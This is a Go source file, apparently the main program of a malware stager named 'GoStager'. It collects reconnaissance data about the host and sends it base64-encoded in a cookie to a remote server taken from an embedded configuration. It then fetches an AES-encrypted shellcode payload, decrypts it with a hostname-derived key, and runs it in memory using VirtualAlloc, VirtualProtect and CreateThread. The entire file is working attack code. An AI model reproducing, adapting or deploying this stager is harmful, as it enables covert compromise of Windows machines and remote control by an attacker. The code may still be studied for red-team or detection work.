package main

import (
	"GoStager/cmd/cryptoUtil"
	"GoStager/cmd/malwareUtil"
	"GoStager/cmd/util"
	_ "embed"
	b64 "encoding/base64"
	"encoding/hex"
	"fmt"
	"golang.org/x/sys/windows"
	"io/ioutil"
	"net/http"
	"strconv"
	"strings"
	"time"
	"unsafe"
)

//go:embed conf.txt
var t string

var (
	body       []byte
	initChecks util.InitialChecks
)

func main() {
	//get the shellcode by http
	conf := strings.Split(t, ",")
	//initial recon
	host := malwareUtil.Recon()
	initChecks, _ = util.UnmarshalJSON(host)
	cookie := b64.StdEncoding.EncodeToString(host)
	//initial request
	body = request(cookie, conf)
	//if the response is not a shellcode, sleep and try again
	for {
		if len(body) > 10 {
			break
		}
		t, _ := strconv.Atoi(string(body))
		sleep(t)
		body = request("", conf)
	}
	key := cryptoUtil.GenerateKey(initChecks.GetHostname(), 32)
	hexSc, _ := cryptoUtil.DecodeAES(body, []byte(key))
	shellcode, _ := hex.DecodeString(string(hexSc))
	//inject the shellcode
	inject(shellcode)
}

func sleep(t int) {
	time.Sleep(time.Duration(t) * time.Second)
}

func request(cookie string, conf []string) []byte {
	c := http.Client{Timeout: time.Duration(3) * time.Second}
	req, _ := http.NewRequest("GET", conf[0], nil)
	req.Header.Add("User-Agent", conf[1])
	if cookie != "" {
		req.Header.Add("Cookie", cookie)
	}
	resp, _ := c.Do(req)
	body, _ = ioutil.ReadAll(resp.Body)
	fmt.Println(string(body))
	return body
}

func inject(shellcode []byte) {

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	rtlCopyMemory := kernel32.NewProc("RtlCopyMemory")
	createThread := kernel32.NewProc("CreateThread")

	shellcodeExec, _ := windows.VirtualAlloc(
		uintptr(0),
		uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE)

	rtlCopyMemory.Call(
		shellcodeExec,
		(uintptr)(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)))

	var oldProtect uint32
	windows.VirtualProtect(
		shellcodeExec,
		uintptr(len(shellcode)),
		windows.PAGE_EXECUTE_READ,
		&oldProtect)

	hThread, _, _ := createThread.Call(
		0,
		0,
		shellcodeExec,
		uintptr(0),
		0,
		0)

	windows.WaitForSingleObject(
		windows.Handle(hThread),
		windows.INFINITE)
}
